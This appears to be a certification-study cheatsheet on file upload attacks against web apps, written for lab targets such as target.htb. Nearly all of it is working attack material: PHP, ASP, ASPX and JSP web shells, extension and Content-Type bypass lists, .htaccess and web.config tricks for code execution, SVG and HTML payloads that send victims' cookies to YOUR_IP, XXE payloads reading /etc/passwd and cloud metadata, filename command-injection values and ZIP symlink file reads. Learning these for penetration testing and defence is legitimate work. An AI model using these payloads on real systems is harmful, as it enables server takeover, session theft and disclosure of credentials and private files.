---
title: "CWES Cheatsheet — File Upload"
date: 2026-03-09
categories: [Certifications, CWES]
tags: [cwes, cheatsheet, file-upload, bypass]
---

file upload vulnerabilities are about getting a shell (or something malicious) onto the server by abusing how upload filters are implemented. the key mindset: every filter has a gap — your job is to figure out what kind of validation is in play, then pick the right bypass.

---

## Fuzzing File Upload Bypasses

### Extension Fuzzing Wordlists

| Wordlist | Description |
|---|---|
| `/usr/share/seclists/Discovery/Web-Content/web-extensions.txt` | general web extensions |
| `/usr/share/seclists/Miscellaneous/web/content-type.txt` | Content-Type values |
| [PHP Extensions List](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | all PHP executable extensions |

### Quick PHP Extension Wordlist

```
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.PHP
.Php
.pHp
.phP
.shtml
```

### Burp Intruder (Recommended for Upload Fuzzing)

```
1. Upload a normal file, capture request in Burp
2. Send to Intruder
3. Set payload position on the extension:
   filename="shell.§php§"
4. Load php_ext.txt as payload list
5. Start attack
6. Look for different response size/code = accepted extension
```

### Fuzz Extensions with ffuf

```bash
# Fuzz which PHP extension is accepted
ffuf -u http://target.htb/upload.php -X POST \
  -H "Content-Type: multipart/form-data; boundary=----boundary" \
  -d "------boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.FUZZ\"\r\nContent-Type: image/gif\r\n\r\nGIF89a\n<?php system('id'); ?>\r\n------boundary--" \
  -w php_ext.txt -fs <default_size>
```

### Fuzz Upload Directory (find where files go)

```bash
# Find upload directories
ffuf -u http://target.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -fc 404 -ic | grep -iE "upload|image|file|img|media|asset"

# Check if your uploaded shell exists
ffuf -u http://target.htb/FUZZ/shell.phtml -w upload_dirs.txt -fc 404
```

**Quick upload directory wordlist (save as `upload_dirs.txt`):**

```
uploads
upload
images
img
files
media
profile_images
assets/uploads
static/uploads
content/uploads
wp-content/uploads
user/uploads
data
tmp
temp
```

### Fuzz Content-Type with Burp Intruder

```
1. Capture upload request in Burp
2. Send to Intruder
3. Set payload position on Content-Type:
   Content-Type: §image/gif§
4. Load content-type.txt as payload list
5. Start attack
6. Different response size = accepted Content-Type
```

**Common Content-Types that bypass filters:**

```
image/gif
image/png
image/jpeg
image/jpg
image/svg+xml
application/octet-stream
```

### Fuzz Content-Type with ffuf

```bash
# Fuzz which Content-Type is accepted
ffuf -u http://target.htb/upload.php -X POST \
  -H "Content-Type: multipart/form-data; boundary=----boundary" \
  -d "------boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.phtml\"\r\nContent-Type: FUZZ\r\n\r\nGIF89a\n<?php system('id'); ?>\r\n------boundary--" \
  -w /usr/share/seclists/Miscellaneous/web/content-type.txt -fs <default_size>
```

### Example Attack Workflow

```
1. Upload normal image → capture in Burp → note response

2. Fuzz extension (Burp Intruder):
   filename="shell.§FUZZ§"
   → Find which extensions are accepted

3. Fuzz Content-Type (Burp Intruder):
   Content-Type: §FUZZ§
   → Find which Content-Types are accepted

4. Combine: accepted extension + accepted Content-Type + GIF89a magic bytes

5. Fuzz upload path:
   ffuf -u http://target.htb/FUZZ/shell.phtml -w upload_dirs.txt

6. Trigger shell:
   curl http://target.htb/uploads/shell.phtml?cmd=whoami
```

---

## File Upload Attacks

### Client-Side Bypass

client side HTML code can be altered to allow file upload validation bypass by removing `validate()`, and optionally clearing the `onchange` and `accept` values.

### Web Shells

| Web Shell | Description |
|---|---|
| `<?php file_get_contents('/etc/passwd'); ?>` | basic PHP file read |
| `<?php system('hostname'); ?>` | basic PHP command execution |
| `<?php echo file_get_contents('/etc/hostname'); ?>` | PHP script to get hostname on back-end server |
| `<?php system($_REQUEST['cmd']); ?>` | basic PHP web shell |
| `<?php echo shell_exec($_GET["cmd"]); ?>` | alternative PHP webshell using shell_exec |
| `<% eval request('cmd') %>` | basic ASP web shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | generate PHP reverse shell |
| `/usr/share/seclists/Web-Shells` | webshells for CFM, FuzzDB, JSP, Laudanum, Magento, PHP, Vtiger and WordPress |
| [PHP Web Shell](https://github.com/Arrexel/phpbash) | PHP web shell |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP reverse shell |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | list of web shells and reverse shells |

### Bypasses

| Command | Description |
|---|---|
| **Client-Side Bypass** | bypass client-side file type validations |
| `[CTRL+SHIFT+C]` | toggle Page Inspector |
| **Blacklist Bypass** | use Burp Suite Intruder to upload a single file name with list of possible extensions, then use Intruder again to perform GET request on all uploaded files to identify PHP execution |
| `shell.phtml` | uncommon extension |
| `shell.pHp` | case manipulation |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | list of PHP extensions |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) | list of ASP extensions |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) | list of web extensions |
| **Whitelist Bypass** | |
| `shell.jpg.php` | double extension bypass |
| `shell.php.jpg` | reverse double extension |

### Additional Bypass Techniques

| Command | Description |
|---|---|
| `shell.php%00.jpg` | null byte bypass (older PHP < 5.3.4) — PHP reads up to `%00` and ignores `.jpg` |
| `shell.php%0a.jpg` | newline bypass |
| `shell.phar` | alternative PHP executable extension — often missed by blacklists |
| `shell.php7` | PHP7 extension |
| `shell.pht` | PHT extension — executes as PHP on many Apache configs |
| `shell.pgif` | another alternative PHP extension |
| `shell.phtml` | often missed by blacklists but still executes as PHP |
| `shell.shtml` | SSI extension (Server Side Include) |
| `shell.PHP` / `shell.pHp` | case manipulation variations |

### Character Injection Wordlist

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '...' ':'; do
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

### Filename Injection Attacks

the filename itself can be an attack vector if the app processes or displays it.

```bash
# Command injection via filename
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami

# XSS via filename
<script>alert(window.origin);</script>.jpg

# SQLi via filename
file';select+sleep(5);--.jpg
```

when this works: if the app uses the filename in an OS command (like `mv file /tmp`), displays it on the page, or inserts it into a database query.

---

## Content-Type and MIME-Type Bypass

### How Content-Type Validation Works

```php
// PHP checks the Content-Type header from the request
$type = $_FILES['uploadFile']['type'];
if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

browser sets this automatically. we control it in Burp — easy bypass.

| Resource | Description |
|---|---|
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) | list of web Content-Types |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | list of all Content-Types |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | list of file signatures / magic bytes |

### Magic Bytes / MIME-Type Bypass

the server checks the first few bytes of your file to verify it's actually an image. we trick it by adding image magic bytes at the top of our PHP shell.

| File Type | Text Signature | Hex |
|---|---|---|
| GIF | `GIF89a` | `47 49 46 38 39 61` |
| PNG | `.PNG` | `89 50 4E 47` |
| JPEG | (non-printable) | `FF D8 FF E0` |
| PDF | `%PDF` | `25 50 44 46` |

### Upload Bypass Methodology

```
Step 1: Try normal shell.php upload
  → If blocked, continue...

Step 2: Bypass client-side (remove JS validation in browser DevTools)
  → Still blocked server-side? continue...

Step 3: Try extension bypasses in Burp:
  .phtml, .phar, .pht, .php7, .php5, .pgif, .PHP

Step 4: Try double extensions:
  shell.php.jpg, shell.jpg.php, shell.php%00.jpg

Step 5: Change Content-Type header in Burp:
  Content-Type: image/gif  (or image/png, image/jpeg)

Step 6: Add magic bytes at top of file:
  GIF89a  (before your PHP code)

Step 7: Combine ALL above together:
  Filename: shell.phtml
  Content-Type: image/gif
  File body: GIF89a + PHP shell

Step 8: If PHP completely blocked, try:
  → .htaccess upload attack (see below)
  → SVG with XXE to read files
  → SVG with XSS for cookie steal
```

---

## Limited Uploads

### XSS via Image Metadata (exiftool)

if the app displays image metadata (EXIF data) after upload, inject XSS into metadata fields:

```bash
# Inject XSS into image Comment field
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' image.jpg

# Verify it's injected
exiftool image.jpg | grep Comment
```

upload the image normally. when the app displays metadata (Comment, Artist, etc.), XSS triggers.

> extra trick: change image MIME-Type to `text/html` — some apps will render it as HTML instead of an image, triggering XSS even without metadata display.
{: .prompt-tip }

### XSS via HTML Upload

```html
<html>
<body>
<script>new Image().src='http://YOUR_IP/?c='+document.cookie;</script>
</body>
</html>
```

1. save as evil.html and upload it
2. send link to victim: `http://target.htb/uploads/evil.html`
3. victim visits and cookie is sent to your listener

### XSS via SVG Upload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(document.cookie);</script>
</svg>
```

**Cookie stealing version:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <script type="text/javascript">
    new Image().src='http://YOUR_IP/?c='+document.cookie;
  </script>
</svg>
```

1. save as evil.svg
2. upload as profile picture
3. start listener: `sudo python3 -m http.server 80`
4. if admin views the image, you receive their cookie
5. use cookie in browser to access admin panel

---

## XXE via SVG — Read Files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

1. save as evil.svg and upload
2. view uploaded image — `/etc/passwd` content displayed on page
3. change target: `file:///flag.txt`, `file:///var/www/html/config.php`

### XXE via SVG — Read PHP Source Code (base64)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

1. upload and view image to get base64 string
2. decode: `echo "BASE64_OUTPUT" | base64 -d`
3. read PHP source to find creds, hidden endpoints, more vulns

### XXE via SVG — SSRF (hit internal services)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"> ]>
<svg>&xxe;</svg>
```

### XXE via SVG — AWS Metadata

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<svg>&xxe;</svg>
```

you can utilize the XXE vulnerability to enumerate internally available services or even call private APIs to perform private actions.

### XXE via XML Upload

if the app accepts XML file imports (config, data, settings):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <data>&xxe;</data>
</root>
```

### XXE via DOCX Upload

`.docx` files are ZIP archives with XML inside. useful for resume/document upload features.

```bash
# Step 1: Create normal .docx in LibreOffice, then unzip
mkdir exploit && cd exploit
unzip ../resume.docx

# Step 2: Edit word/document.xml — add DTD at top:
# <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
# <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

# Step 3: Add &xxe; inside any <w:t> tag in the body:
# <w:t>&xxe;</w:t>

# Step 4: Rezip as .docx
cd exploit && zip -r ../evil.docx .

# Step 5: Upload evil.docx
# If server parses it → response/rendered doc contains /etc/passwd
```

when this works: resume parsers, document converters, report generators, anything that processes DOCX server-side.

### SSRF via PDF (HTML-to-PDF converters)

if the app converts HTML to PDF (wkhtmltopdf, WeasyPrint, etc.):

```html
<iframe src="http://127.0.0.1:8080/admin" width="800" height="800"></iframe>
<img src="http://169.254.169.254/latest/meta-data/">
```

1. if you can inject HTML that gets converted to PDF
2. the generated PDF contains internal page content — SSRF works
3. try: internal admin panels, cloud metadata, internal APIs

---

## Upload Directory Discovery

```bash
# Upload file with same name twice (may error with path)

# Upload file with very long name (5000+ chars)
python3 -c "print('A'*5000 + '.php')"

# Upload with Windows reserved names (if Windows server)
# Try filenames: CON, COM1, LPT1, NUL, PRN
# May cause error that reveals upload directory
```

### Fuzz for upload directory

```bash
ffuf -u http://target.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -fc 404

# Common upload paths
/uploads/ /upload/ /images/ /img/ /files/
/media/ /profile_images/ /assets/uploads/
```

### Read source code via LFI or XXE

```bash
# If you have LFI, read the upload PHP source
php://filter/read=convert.base64-encode/resource=upload.php
```

---

## Windows-Specific Upload Attacks

only relevant if target is Windows server (IIS, XAMPP on Windows, etc.)

**Reserved characters in filename (may leak upload path via error):**

```bash
shell|.php
shell<.php
shell>.php
shell*.php
shell?.php
```

**Reserved filenames (may cause error with path disclosure):**

```bash
CON
COM1
LPT1
NUL
PRN
```

**8.3 filename convention (overwrite existing files):**

```bash
# Windows short filename format
# hackthebox.txt = HAC~1.TXT
# web.config = WEB~1.CON

# Upload WEB~1.CON to potentially overwrite web.config
```

**Case insensitive (Windows only):**

```bash
shell.pHp    # Windows treats as .php
shell.PhP    # Also works on Windows
SHELL.PHP    # Also works
```

Linux servers are case-sensitive — `shell.pHp` won't execute as PHP on Linux.

---

## .htaccess Upload Attack

if the server blocks ALL PHP extensions but lets you upload other files, upload a `.htaccess` that tells Apache to execute a custom extension as PHP.

**Step 1 — Upload a file named `.htaccess` with this content:**

```
AddType application/x-httpd-php .evil
```

this tells Apache: "treat any `.evil` file as PHP"

**Step 2 — Upload `shell.evil` with your PHP webshell:**

```php
<?php system($_REQUEST['cmd']); ?>
```

**Step 3 — Access it:**

```bash
http://target.htb/uploads/shell.evil?cmd=whoami
```

### IIS equivalent — upload web.config

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
        scriptProcessor="%windir%\system32\inetsrv\asp.dll"
        resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

### Alternative PHP Functions (when system() is disabled)

sometimes `system()` is in `disable_functions`. upload `<?php phpinfo(); ?>` first to check, then try alternatives:

```php
<?php echo exec($_REQUEST['cmd']); ?>
<?php echo passthru($_REQUEST['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php $o = `$_REQUEST['cmd']`; echo $o; ?>
<?php $o = popen($_REQUEST['cmd'], 'r'); echo fread($o, 4096); ?>
```

### Path Traversal in Filename (Burp)

```
Before:
Content-Disposition: form-data; name="file"; filename="shell.php"

After (try each):
Content-Disposition: form-data; name="file"; filename="../shell.php"
Content-Disposition: form-data; name="file"; filename="../../shell.php"
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
```

the app saves uploads to `/var/www/html/uploads/` where PHP execution is disabled. using `filename="../shell.php"` places it in `/var/www/html/shell.php` where PHP does execute. access: `http://target.htb/shell.php?cmd=id`

---

## Webshells for Different Languages

```bash
# PHP
<?php system($_REQUEST['cmd']); ?>

# ASP
<% eval request("cmd") %>

# ASPX
<%@ Page Language="C#" %>
<% Response.Write(new System.Diagnostics.Process(){
  StartInfo=new System.Diagnostics.ProcessStartInfo("cmd",
  "/c "+Request["cmd"]){UseShellExecute=false,
  RedirectStandardOutput=true}}.Start().StandardOutput.ReadToEnd()); %>

# JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

---

## Scenarios

| Scenario | What to Do |
|---|---|
| Upload PHP blocked entirely | upload `.htaccess` first, then `shell.evil` |
| Only images allowed | SVG with XXE to read source code and find more vulns |
| Only images allowed + displayed | SVG with XSS for cookie steal |
| ZIP upload allowed | zip symlink: `ln -s /etc/passwd link && zip --symlinks shell.zip link` |
| Upload works but shell doesn't execute | try path traversal in filename `../shell.php` |
| Upload works but can't find file | fuzz upload dirs, check response, check `<img>` in page source |
| Upload + SQLi | upload shell, use SQLi `LOAD_FILE()` to read it or `INTO OUTFILE` to write shell |

### Scenario 1: Normal PHP Upload Works

no filters at all, or only client-side validation.

```
1. Save as shell.php
2. If client-side blocks it → remove JS validation in DevTools
3. Or capture in Burp → change filename back to shell.php
4. Upload → find path → trigger: ?cmd=whoami
```

### Scenario 2: PHP Extension Blocked (Blacklist)

`.php` is blocked but server runs PHP.

```
1. Try alternative extensions one by one:
   shell.phtml
   shell.phar
   shell.pht
   shell.php7
   shell.php5
   shell.pgif
   shell.PHP
   shell.pHp

2. Or fuzz with Burp Intruder using php_ext.txt wordlist

3. Upload accepted extension → access it → ?cmd=whoami
```

### Scenario 3: Only Image Extensions Allowed (Whitelist)

server only allows `.jpg`, `.png`, `.gif`.

```
1. Try double extension:
   shell.php.jpg
   shell.jpg.php

2. Try null byte:
   shell.php%00.jpg

3. Try character injection:
   shell.php%0a.jpg
   shell.jpg:.php

4. Generate wordlist with character injection script and fuzz with Burp Intruder

5. If NOTHING works → move to Scenario 7 (Limited Uploads)
```

### Scenario 4: Content-Type Validation

server checks `Content-Type` header.

```
1. Upload shell.php
2. Capture in Burp
3. Change Content-Type from application/x-php to:
   Content-Type: image/gif
   Content-Type: image/png
   Content-Type: image/jpeg

4. Forward request
5. If still blocked → fuzz Content-Type with Burp Intruder using content-type.txt
```

### Scenario 5: Magic Bytes / MIME-Type Validation

server reads first bytes of file to verify it's a real image.

```
1. Add magic bytes at the top of your PHP shell:

GIF89a
<?php system($_REQUEST['cmd']); ?>

2. Save as shell.php (or shell.phtml if extension also blocked)
3. Change Content-Type to image/gif in Burp
4. Upload → access → ?cmd=whoami

Example:

Filename: shell.phtml
Content-Type: image/gif
File body:
GIF89a
<?php system($_REQUEST['cmd']); ?>
```

### Scenario 6: ALL PHP Extensions Blocked

every PHP extension is blocked, nothing gets through.

**Limited Uploads:**

| Potential Attack | File Types |
|---|---|
| XSS | HTML, JS, SVG, GIF |
| XXE/SSRF | XML, SVG, PDF, PPT, DOC |
| DoS | ZIP, JPG, PNG |

```
1. Upload a file named .htaccess with content:
   AddType application/x-httpd-php .evil

2. Upload shell.evil with content:
   <?php system($_REQUEST['cmd']); ?>

3. Access: http://target.htb/uploads/shell.evil?cmd=whoami
```

### Scenario 7: Only Images Allowed — No PHP Execution Possible

you absolutely cannot get PHP to execute. only real images accepted.

**Try SVG XXE to read files:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

1. save as evil.svg
2. upload as profile picture
3. view the image — `/etc/passwd` content displayed
4. change to read flag: `file:///flag.txt`
5. read PHP source: `php://filter/convert.base64-encode/resource=upload.php`
6. decode: `echo "BASE64" | base64 -d`

**Try SVG XSS to steal cookies:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <script type="text/javascript">
    new Image().src='http://YOUR_IP/?c='+document.cookie;
  </script>
</svg>
```

1. save as evil.svg and upload
2. start listener: `sudo python3 -m http.server 80`
3. if admin views the image, you receive their cookie
4. use cookie in browser to access admin panel

### Scenario 8: Only DOCX/PDF Allowed

resume upload, document upload, report upload.

**Try DOCX XXE:**

```bash
# Step 1: Create normal.docx in LibreOffice, then:
mkdir exploit && cd exploit
unzip ../normal.docx

# Step 2: Edit word/document.xml, add at top:
# <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
# <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

# Step 3: Find any <w:t> tag and add &xxe; inside:
# <w:t>&xxe;</w:t>

# Step 4: Rezip
cd exploit && zip -r ../evil.docx .

# Step 5: Upload evil.docx
# If server parses it → response contains /etc/passwd
```

**Try PDF SSRF (if server uses HTML-to-PDF converter):**

```html
<!-- If you can inject HTML that gets converted to PDF -->
<iframe src="http://127.0.0.1:8080/admin" width="800" height="800"></iframe>
<img src="http://169.254.169.254/latest/meta-data/">
```

1. if the generated PDF contains internal page content — SSRF works
2. try reading internal services, admin panels, cloud metadata

### Scenario 9: ZIP Upload Allowed

server accepts ZIP and extracts contents.

**Symlink attack to read files:**

```bash
# On Kali
ln -s /etc/passwd link.txt
zip --symlinks shell.zip link.txt

# Upload shell.zip → if app extracts it, link.txt contains /etc/passwd
# Access: http://target.htb/uploads/link.txt
```

### Scenario 10: Upload Works but Shell Doesn't Execute

file uploads successfully but visiting it doesn't run PHP.

```
1. Check if you're accessing the right path
   → Right-click image → copy address
   → Fuzz upload directories with ffuf

2. Upload directory might have execution disabled
   → Try path traversal in filename:
   filename="../shell.php"
   filename="../../shell.php"
   → Places file outside uploads/ into an executable directory

3. Check if server renames your file
   → Upload → check response for new filename
   → Try accessing with the renamed filename

4. Check file extension was preserved
   → Some servers strip .php and save as shell only
   → Try double extension: shell.php.jpg (server strips .jpg, keeps .php)
```

**Path traversal in Burp:**

```
Content-Disposition: form-data; name="file"; filename="../shell.php"
```

### Scenario 11: system() Disabled on Server

PHP shell uploads and executes, but `?cmd=whoami` returns blank.

```
1. Upload phpinfo first:
   <?php phpinfo(); ?>

2. Access it → search for "disable_functions"

3. Try alternatives based on what's NOT disabled:
   <?php echo exec($_REQUEST['cmd']); ?>
   <?php echo passthru($_REQUEST['cmd']); ?>
   <?php echo shell_exec($_REQUEST['cmd']); ?>
   <?php $o = `$_REQUEST['cmd']`; echo $o; ?>
   <?php $o = popen($_REQUEST['cmd'],'r'); echo fread($o,4096); ?>

4. Re-upload with working function
```

### Scenario 12: Upload to Chain with Other Vulns

upload alone doesn't give you the flag, need to chain.

| Chain Path | Steps |
|---|---|
| SVG XXE to read source code, find hardcoded creds, login as admin, upload PHP shell | `SVG XXE → Source Code → Creds → Admin → RCE` |
| SVG XSS to steal admin cookie, access admin panel, upload PHP shell | `SVG XSS → Cookie → Admin → RCE` |
| SVG XXE to read config.php, find DB creds, SQLi or direct DB access | `SVG XXE → Config → DB Access` |
| HTML XSS phishing form to capture admin creds, login as admin | `HTML XSS → Phishing → Creds → Admin` |
| SQLi to write webshell via INTO OUTFILE, access shell | `SQLi → File Write → RCE` |
| ZIP symlink to read SSH key, SSH as user | `ZIP Symlink → SSH Key → Shell` |

---

[← Back to CWES Cheatsheet Index](/posts/cwes-cheatsheet/)
